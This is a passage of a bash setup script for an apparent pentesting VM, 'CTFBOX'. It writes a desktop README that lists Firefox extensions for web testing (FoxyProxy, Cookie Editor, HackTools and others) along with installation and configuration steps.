if [[ ! -f "$USER_HOME/Desktop/FIREFOX_EXTENSIONS.txt" ]]; then
    cat > "$USER_HOME/Desktop/FIREFOX_EXTENSIONS.txt" << 'FIREFOX_DOC_EOF'
CTFBOX v3.6 — FIREFOX EXTENSIONS
-----------------------------------------

✅ EXTENSIONS TO BE INSTALLED:

1. Dark Reader - Auto dark mode for all websites
2. Cookie Editor - View/edit/delete cookies
3. FoxyProxy - Quick proxy switching (Burp/ZAP)
4. Wappalyzer - Identify web technologies
5. HackTools - Pentesting cheat sheets & payloads
6. User-Agent Switcher - Spoof browser identity

-----------------------------------------
INSTALLATION:

METHOD 1 (Automatic - First Launch):
• Open Firefox after reboot
• Extensions auto-install via enterprise policy
• Wait 30 seconds for downloads
• Approve extensions when prompted

METHOD 2 (Manual - If Auto-Install Fails):
• Close Firefox completely
• Run: ~/install-firefox-extensions.sh
• Launch Firefox
• Approve each extension when prompted

-----------------------------------------
TROUBLESHOOTING:

If extensions don't appear:
1. Check ~/install-firefox-extensions.sh exists
2. Run it with Firefox closed
3. Check ~/.firefox-extensions/ for .xpi files
4. Manually drag .xpi files into Firefox window

Check if policy is active:
• Open Firefox
• Type: about:policies
• Should show "ExtensionSettings" policy

-----------------------------------------
QUICK START (AFTER INSTALLATION):

• FoxyProxy: Click icon → Add Burp (127.0.0.1:8080)
• Cookie Editor: Right-click page → Inspect cookies
• HackTools: Ctrl+Shift+H (sidebar opens)
• Dark Reader: Auto-enabled on all sites

-----------------------------------------
FIREFOX SETTINGS:

• Developer Tools Theme: Dark
• Downloads: ~/Downloads
• Cache: Disabled (RAM only)
• Tracking Protection: Off (for pentesting)
• DNS-over-HTTPS: Disabled

-----------------------------------------
FILE LOCATIONS:

• Policy: /usr/lib/firefox/distribution/policies.json
• Extensions: ~/.firefox-extensions/*.xpi
• Installer: ~/install-firefox-extensions.sh
• Config: ~/.mozilla/firefox/user.js.template
FIREFOX_DOC_EOF
    log_info "Created FIREFOX_EXTENSIONS.txt"
else
    log_skip "FIREFOX_EXTENSIONS.txt already exists"
